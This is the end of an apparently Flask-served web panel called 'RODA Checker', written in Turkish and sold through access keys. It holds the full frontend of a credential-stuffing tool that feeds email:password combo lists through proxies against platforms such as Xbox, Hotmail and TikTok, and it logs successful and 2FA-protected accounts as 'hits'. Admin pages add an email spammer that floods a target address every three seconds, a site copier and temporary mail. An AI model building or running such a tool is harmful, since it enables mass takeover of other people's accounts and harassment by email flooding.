.setting-row .desc{font-size:10px;color:var(--muted)}
.switch{position:relative;width:40px;height:22px}
.switch input{display:none}
.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
input:checked+.slider{background:var(--g)}
input:checked+.slider:before{transform:translateX(18px)}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
</style>
</head>
<body>
<div class="snowflakes" id="snowContainer"></div>
<div id="login-screen">
<div id="login-box">
<div class="logo"><i class="fa-solid fa-crown"></i></div>
<h1>RODA</h1>
<p class="sub">Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
</div>
</div>
<div id="sidebar">
<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
<div class="sidebar-nav">
<div class="nav-divider">📁 MENÜ</div>
<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
<div class="nav-divider-admin">🔒 ADMIN</div>
<div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
<div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
<div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
</div>
<div class="sidebar-stats">
<div class="mini-stat mini-hit"><div class="val" id="sideHit">0</div><div class="lbl">Hit</div></div>
<div class="mini-stat mini-2fa"><div class="val" id="side2fa">0</div><div class="lbl">2FA</div></div>
<div class="mini-stat mini-bad"><div class="val" id="sideBad">0</div><div class="lbl">Bad</div></div>
<div class="mini-stat mini-check"><div class="val" id="sideTotal">0</div><div class="lbl">Toplam</div></div>
</div>
<div class="sidebar-footer">© 2026 Roda</div>
</div>
<div id="app">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
<div class="topbar-right">
<span style="font-size:11px;color:var(--muted)">Durum:</span>
<div class="pulse-dot idle" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">
<!-- CHECKER -->
<div id="page-checker" class="page active">
<div class="card">
<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
<div class="checker-platform-select" id="checkerPlatformSelect"></div>
<div class="checker-panel" id="checkerPanel">
<div class="checker-top">
<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
<input type="number" id="checkerThreads" value="1" min="1" max="20">
<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="checker-stats">
<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
<span>Hata: <span class="chk-count" id="chkError">0</span></span>
</div>
<div class="checker-results" id="checkerResults">
<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
</div>
</div>
</div>
<div class="card">
<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
<button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
<div class="hit-filter">
<select id="hitPlatformFilter" onchange="renderHits()">
<option value="all">Tüm Platformlar</option>
</select>
</div>
<div class="hit-panel">
<div class="hit-box">
<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
</div>
<div class="hit-box">
<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
</div>
</div>
</div>
</div>
<!-- PROXY -->
<div id="page-proxy" class="page">
<div class="card">
<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
<div class="setting-row">
<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
</div>
<div class="proxy-area">
<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
</div>
<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
</div>
</div>
<!-- AYRIŞTIRMA -->
<div id="page-parse" class="page">
<div class="card">
<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">2 mod seçeneği ile ayrıştırır.</p>
<div class="parse-area">
<label style="font-size:13px;color:var(--muted)">Mod Seç:</label>
<select id="parseMode" style="padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;width:200px">
<option value="email">Email:Şifre</option>
<option value="user">Kullanıcı:Şifre</option>
</select>
<textarea id="parseInput" placeholder="Metni yapıştır..."></textarea>
<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
<div class="parse-result" id="parseResult"></div>
</div>
</div>
</div>
<!-- LOGLAR (ADMIN) -->
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>
<!-- KEY YÖNETİMİ (ADMIN) -->
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Yönetimi</h3>
<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Admin ve Müşteri key oluşturabilirsiniz.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
</div>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>
<!-- SİTE KOPYALA (ADMIN) -->
<div id="page-sitecopy" class="page">
<div class="card">
<h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
<input class="inp" id="siteCopyUrl" placeholder="https://ornek.com" style="margin-bottom:10px">
<button class="btn sm" onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
<div id="siteCopyResult" style="margin-top:10px;font-size:13px;color:var(--muted)"></div>
</div>
</div>
<!-- TEMP MAIL (ADMIN) -->
<div id="page-tempmail" class="page">
<div class="card">
<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px">
<input class="inp" id="tempMailInput" placeholder="E-posta" readonly style="flex:1;padding:10px">
<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Üret</button>
<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
</div>
<button class="btn sm" onclick="refreshTempMail()" style="margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
</div>
</div>
<!-- EMAIL SPAMMER (ADMIN) -->
<div id="page-spammer" class="page">
<div class="card">
<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px">
<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>
</div>
</div>
<script>
// KAR TANELERİ
(function createSnow(){
    var container=document.getElementById('snowContainer');
    var flakes=['❄','❅','❆','✦'];
    for(var i=0;i<50;i++){
        var flake=document.createElement('div');
        flake.className='snowflake';
        flake.textContent=flakes[Math.floor(Math.random()*flakes.length)];
        flake.style.left=Math.random()*100+'%';
        flake.style.fontSize=(0.8+Math.random()*1.5)+'em';
        flake.style.animationDuration=(6+Math.random()*8)+'s';
        flake.style.animationDelay=Math.random()*5+'s';
        container.appendChild(flake);
    }
})();

var currentKey="", isAdmin=false, checkerRunning=false, currentPlatform="", hitData={};
var platforms=[
    {name:"Tabii", icon:"fa-solid fa-tv"},
    {name:"Xbox & MC", icon:"fa-brands fa-xbox"},
    {name:"Wolfteam", icon:"fa-solid fa-skull"},
    {name:"Craftrise", icon:"fa-solid fa-hammer"},
    {name:"Hotmail", icon:"fa-solid fa-envelope"},
    {name:"Token Check", icon:"fa-solid fa-key"},
    {name:"TikTok Gen", icon:"fa-brands fa-tiktok"}
];
var totalLines=0, processedCount=0, hit=0, bad=0, two=0, err=0;
var useProxy=false, tempMailToken="", spamInterval=null;

function doLogin(){
    var k=document.getElementById("authKey").value.trim();
    if(!k){ alert("Anahtar girin!"); return; }
    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key:k})})
    .then(r=>r.json())
    .then(d=>{
        if(d.success){
            currentKey=k; isAdmin=d.isAdmin||false;
            document.getElementById("login-screen").style.display="none";
            document.getElementById("app").style.display="flex";
            if(isAdmin){
                document.getElementById("userBadge").style.display="inline-block";
                ["logsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(id=>document.getElementById(id).style.display="flex");
                loadKeys();
            }
            loadPlatforms();
            loadHitFilter();
            switchPage('checker');
        }else{
            document.getElementById("loginError").innerText="❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display="block";
        }
    })
    .catch(e=>alert("Sunucuya bağlanılamadı!"));
}
document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key==="Enter") doLogin(); });

function loadPlatforms(){
    var sel=document.getElementById("checkerPlatformSelect");
    sel.innerHTML="";
    platforms.forEach(function(p){
        var btn=document.createElement("button");
        btn.innerHTML='<i class="'+p.icon+'"></i> '+p.name;
        btn.onclick=function(){
            document.querySelectorAll("#checkerPlatformSelect button").forEach(b=>b.classList.remove("active"));
            btn.classList.add("active");
            currentPlatform=p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML='<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">'+p.name+' hazır.</div>';
            resetStats();
        };
        sel.appendChild(btn);
    });
    if(platforms.length>0) sel.querySelector("button").click();
}

function loadHitFilter(){
    var sel=document.getElementById("hitPlatformFilter");
    sel.innerHTML='<option value="all">Tüm Platformlar</option>';
    platforms.forEach(p=>{ var opt=document.createElement("option"); opt.value=p.name; opt.text=p.name; sel.appendChild(opt); });
}

function resetStats(){
    document.getElementById("chkTotal").innerText=0;
    document.getElementById("chkHit").innerText=0;
    document.getElementById("chkBad").innerText=0;
    document.getElementById("chk2fa").innerText=0;
    document.getElementById("chkError").innerText=0;
    hit=bad=two=err=0;
}

function addHit(platform,email,password,status,details){
    if(!hitData[platform]) hitData[platform]={hits:[], twofa:[]};
    var entry={email:email, password:password, time:new Date().toLocaleString()};
    if(status==="HIT") hitData[platform].hits.push(entry);
    else if(status==="2FA") hitData[platform].twofa.push(entry);
    renderHits();
    updateSideStats();
}

function renderHits(){
    var filter=document.getElementById("hitPlatformFilter").value;
    var hitContainer=document.getElementById("hitList");
    var twofaContainer=document.getElementById("twofaList");
    var hits=[], twofas=[];
    if(filter==="all"){
        for(var p in hitData){
            if(hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({platform:p, email:h.email, password:h.password, time:h.time}); });
            if(hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({platform:p, email:t.email, password:t.password, time:t.time}); });
        }
    }else{
        if(hitData[filter]){
            if(hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({platform:filter, email:h.email, password:h.password, time:h.time}); });
            if(hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({platform:filter, email:t.email, password:t.password, time:t.time}); });
        }
    }
    hitContainer.innerHTML=hits.length===0?'<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>':
        hits.map(h=>'<div class="hit-item"><span class="hit-email">['+h.platform+'] '+h.email+' | '+h.password+'</span><span class="hit-time">'+h.time+'</span></div>').join('');
    twofaContainer.innerHTML=twofas.length===0?'<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>':
        twofas.map(t=>'<div class="hit-item"><span class="hit-email">['+t.platform+'] '+t.email+' | '+t.password+'</span><span class="hit-time">'+t.time+'</span></div>').join('');
}

function updateSideStats(){
    document.getElementById("sideHit").innerText=hit;
    document.getElementById("side2fa").innerText=two;
    document.getElementById("sideBad").innerText=bad;
    document.getElementById("sideTotal").innerText=hit+two+bad+err;
}

function clearHits(){
    if(!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
    hitData={}; renderHits();
}

function startChecker(){
    if(checkerRunning) return;
    var comboText=document.getElementById("checkerCombo").value.trim();
    if(!comboText) return alert("Combo girin!");
    if(!currentPlatform) return alert("Platform seçin!");
    checkerRunning=true;
    document.getElementById("checkerStartBtn").disabled=true;
    document.getElementById("checkerStopBtn").style.display="inline-block";
    document.getElementById("checkerResults").innerHTML="";
    var lines=comboText.split("\n").filter(l=>l.includes(":"));
    totalLines=lines.length; processedCount=0; hit=bad=two=err=0;
    var threads=parseInt(document.getElementById("checkerThreads").value)||1;
    var idx=0, active=0;

    function processNext(){
        if(!checkerRunning || idx>=totalLines){
            if(active===0){ checkerRunning=false; document.getElementById("checkerStartBtn").disabled=false; document.getElementById("checkerStopBtn").style.display="none"; }
            return;
        }
        var parts=lines[idx].split(":");
        var email=parts[0], password=parts.slice(1).join(":")||"";
        idx++; active++;
        var proxy=null;
        if(useProxy){
            var plist=document.getElementById("proxyList").value.trim().split("\n").filter(l=>l.trim()&&l.includes(":"));
            if(plist.length) proxy=plist[Math.floor(Math.random()*plist.length)];
        }
        fetch("/api/check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({platform:currentPlatform, email:email, password:password, proxy:proxy})})
        .then(r=>r.json())
        .then(result=>{
            var status=result.status||"ERROR";
            if(status==="HIT"){ hit++; addHit(currentPlatform,email,password,"HIT"); }
            else if(status==="2FA"){ two++; addHit(currentPlatform,email,password,"2FA"); }
            else if(status==="BAD"){ bad++; }
            else{ err++; }
            processedCount++;
            document.getElementById("chkTotal").innerText=totalLines;
            document.getElementById("chkHit").innerText=hit;
            document.getElementById("chkBad").innerText=bad;
            document.getElementById("chk2fa").innerText=two;
            document.getElementById("chkError").innerText=err;
            updateSideStats();
            var row=document.createElement("div"); row.className="checker-result-row";
            var cls="chk-"+(status==="HIT"?"hit":status==="2FA"?"2fa":status==="BAD"?"bad":"error");
            var label=status==="HIT"?"✅ BAŞARILI":status==="2FA"?"🔒 2FA":status==="BAD"?"❌ BAŞARISIZ":"⚠ HATA";
            row.innerHTML='<div>'+email+'</div><div><span class="chk-status '+cls+'">'+label+'</span></div><div style="font-size:11px;color:var(--muted)">'+password+'</div>';
            document.getElementById("checkerResults").appendChild(row);
            active--; processNext();
        })
        .catch(()=>{ err++; processedCount++; active--; processNext(); });
    }
    for(var i=0; i<threads; i++) processNext();
}

function stopChecker(){ checkerRunning=false; document.getElementById("checkerStartBtn").disabled=false; document.getElementById("checkerStopBtn").style.display="none"; }

function switchPage(page){
    if((page==="logs"||page==="keys"||page==="sitecopy"||page==="tempmail"||page==="spammer")&&!isAdmin){
        alert("⛔ Admin girişi yapın!"); return;
    }
    document.querySelectorAll(".nav-item").forEach(el=>el.classList.remove("active"));
    var el=document.querySelector('.nav-item[data-page="'+page+'"]');
    if(el) el.classList.add("active");
    document.querySelectorAll(".page").forEach(el=>el.classList.remove("active"));
    var pg=document.getElementById("page-"+page);
    if(pg) pg.classList.add("active");
    var titles={checker:"Checker", proxy:"Proxy", parse:"Ayrıştırma", logs:"Loglar", keys:"Key Yönetimi", sitecopy:"Site Kopyala", tempmail:"Temp Mail", spammer:"Email Spammer"};
    document.getElementById("pageTitle").innerText=titles[page]||page;
    if(page==="keys"&&isAdmin) loadKeys();
    if(page==="logs"&&isAdmin) refreshLogs();
}

function toggleProxy(){ useProxy=document.getElementById("useProxy").checked; }

function fetchProxies(){
    document.getElementById("proxyCount").innerText="Çekiliyor...";
    fetch("/api/fetch_proxies").then(r=>r.json()).then(d=>{ if(d.success){ document.getElementById("proxyList").value=d.proxies.join("\n"); document.getElementById("proxyCount").innerText=d.proxies.length+" proxy yüklendi"; } }).catch(e=>document.getElementById("proxyCount").innerText="Başarısız");
}
function clearProxies(){ document.getElementById("proxyList").value=""; document.getElementById("proxyCount").innerText="0 proxy"; }

function parseData(){
    var raw=document.getElementById("parseInput").value;
    if(!raw.trim()) return alert("Metin girin!");
    var mode=document.getElementById("parseMode").value;
    var lines=raw.split("\n"), result=[];
    var emailRegex=/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    lines.forEach(function(line){
        line=line.trim(); if(!line || !line.includes(":")) return;
        var parts=line.split(":"), first=parts[0].trim(), password=parts.slice(1).join(":").trim();
        if(!password) return;
        if(mode==="email" && emailRegex.test(first)) result.push(first+":"+password);
        else if(mode==="user" && !emailRegex.test(first)) result.push(first+":"+password);
    });
    result=result.filter((item,index)=>result.indexOf(item)===index);
    var container=document.getElementById("parseResult");
    if(result.length===0) container.innerHTML='<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
    else{ var html='<div class="parse-count">'+result.length+' satır bulundu</div>'; result.forEach(line=>html+='<div class="parse-line">'+line+'</div>'); container.innerHTML=html; }
}
function parseToChecker(){
    var container=document.getElementById("parseResult");
    var lines=container.querySelectorAll(".parse-line");
    var text="";
    lines.forEach(el=>text+=el.textContent+"\n");
    document.getElementById("checkerCombo").value=text.trim();
    alert("Checker'a aktarıldı!");
}

function refreshLogs(){
    if(!isAdmin) return;
    fetch("/api/logs?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
        if(d.error) return alert(d.error);
        var container=document.getElementById("logsContainer");
        container.innerHTML=d.logs.map(log=>'<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:'+(log.level==="ERROR"?"var(--r)":log.level==="SUCCESS"?"var(--g)":"var(--muted)")+'">['+log.timestamp+'] '+log.message+'</div>').join('')||'<div style="color:var(--muted)">Henüz log yok.</div>';
    });
}

function loadKeys(){
    if(!isAdmin) return;
    fetch("/api/admin/keys?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
        if(d.error) return alert(d.error);
        var list=document.getElementById("keyList");
        var html="";
        for(var k in d){
            var v=d[k], exp=v.expires?new Date(v.expires).toLocaleString():"Süresiz";
            var ip=v.bound_ip||"Bağlanmamış", used=v.used?"✅ Kullanıldı":"❌ Kullanılmadı";
            html+='<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong>'+k+'</strong><br><small style="color:var(--muted)">'+v.note+' | '+exp+' | IP:'+ip+' | '+used+'</small></div><button class="btn sm r" onclick="deleteKey(\''+k+'\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
        }
        list.innerHTML=html||'<p style="color:var(--muted)">Hiç key yok.</p>';
    });
}
function generateKey(){
    if(!isAdmin) return;
    var note=document.getElementById("genNote").value||"Oluşturuldu";
    var hours=document.getElementById("genHours").value;
    fetch("/api/admin/generate", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({master_key:currentKey, note:note, hours:hours})})
    .then(r=>r.json()).then(d=>{ if(d.success){ alert("Key: "+d.key+"\nBitiş: "+d.expires); loadKeys(); } else alert("Başarısız"); });
}
function deleteKey(target){
    if(!confirm("Sil?")) return;
    fetch("/api/admin/delete", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({master_key:currentKey, target_key:target})})
    .then(r=>r.json()).then(d=>{ if(d.success) loadKeys(); });
}

function copySite(){
    if(!isAdmin) return alert("Admin girişi yapın!");
    var url=document.getElementById("siteCopyUrl").value.trim();
    if(!url) return alert("URL girin!");
    document.getElementById("siteCopyResult").innerHTML="Kopyalanıyor...";
    fetch("/api/sitecopy?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({url:url})})
    .then(r=>{
        if(!r.ok) return r.json().then(d=>{throw new Error(d.error)});
        return r.blob();
    })
    .then(blob=>{
        var a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download="kopyalanan_site.html"; a.click();
        document.getElementById("siteCopyResult").innerHTML="✅ Kopyalandı!";
    })
    .catch(e=>document.getElementById("siteCopyResult").innerHTML="❌ Hata: "+e.message);
}

function generateTempMail(){
    if(!isAdmin) return alert("Admin girişi yapın!");
    document.getElementById("tempMailInput").value="Üretiliyor...";
    fetch("/api/temp_mail_generate?key="+encodeURIComponent(currentKey), {method:"POST"})
    .then(r=>r.json()).then(d=>{
        if(d.success){ tempMailToken=d.token; document.getElementById("tempMailInput").value=d.email; document.getElementById("tempMailInbox").innerHTML="E-posta oluşturuldu. Gelen kutusunu yenileyin."; document.getElementById("tempMailContent").innerHTML=""; }
        else alert("Hata: "+d.error);
    });
}
function copyTempMail(){
    var val=document.getElementById("tempMailInput").value;
    if(val && val!=="Üretiliyor...") navigator.clipboard.writeText(val).catch(()=>{});
}
function refreshTempMail(){
    if(!isAdmin || !tempMailToken) return alert("Önce e-posta oluşturun!");
    document.getElementById("tempMailInbox").innerHTML="Yükleniyor...";
    fetch("/api/temp_mail_refresh?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({token:tempMailToken})})
    .then(r=>r.json()).then(d=>{
        if(d.success && d.messages){
            var html="";
            d.messages.forEach(msg=>{ html+='<div onclick="readTempMail(\''+msg.id+'\')" style="padding:8px;border-bottom:1px solid var(--border);cursor:pointer;">📩 '+msg.from.address+' - '+msg.subject+'</div>'; });
            document.getElementById("tempMailInbox").innerHTML=html||"Kutu boş.";
        }else document.getElementById("tempMailInbox").innerHTML="Hata: "+d.error;
    });
}
function readTempMail(msgId){
    if(!isAdmin || !tempMailToken) return;
    document.getElementById("tempMailContent").innerHTML="Yükleniyor...";
    fetch("/api/temp_mail_read?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({token:tempMailToken, msg_id:msgId})})
    .then(r=>r.json()).then(d=>{
        if(d.success){
            var msg=d.message;
            document.getElementById("tempMailContent").innerHTML='<div style="background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;"><div><strong>Kimden:</strong> '+msg.from.address+'</div><div><strong>Konu:</strong> '+msg.subject+'</div><div style="margin-top:8px;">'+(msg.text||'').replace(/\n/g,'<br>')+'</div></div>';
        }else document.getElementById("tempMailContent").innerHTML="Hata: "+d.error;
    });
}

function startSpam(){
    if(!isAdmin) return alert("Admin girişi yapın!");
    var email=document.getElementById("spamEmailInput").value.trim();
    if(!email) return alert("Hedef e-posta girin!");
    if(spamInterval) return;
    document.getElementById("spamStopBtn").style.display="inline-block";
    var log=document.getElementById("spamLog");
    log.innerHTML+='<div style="color:var(--gold)">[Sistem] '+email+' için spam başlatıldı...</div>';
    function send(){
        if(!spamInterval) return;
        fetch("/api/spam_send?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({email:email})})
        .then(r=>r.json()).then(d=>{ log.innerHTML+='<div style="color:'+(d.success?'var(--g)':'var(--r)')+'">['+new Date().toLocaleTimeString()+'] '+(d.message||'Hata')+'</div>'; log.scrollTop=log.scrollHeight; });
    }
    spamInterval=setInterval(send, 3000);
    send();
}
function stopSpam(){
    clearInterval(spamInterval);
    spamInterval=null;
    document.getElementById("spamStopBtn").style.display="none";
    document.getElementById("spamLog").innerHTML+='<div style="color:var(--r)">[Sistem] Spam durduruldu.</div>';
}
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Roda çalışıyor: http://0.0.0.0:{port}")
    print(f"🔑 Master Key: {MASTER_KEY}")
    app.run(host="0.0.0.0", port=port, debug=False)
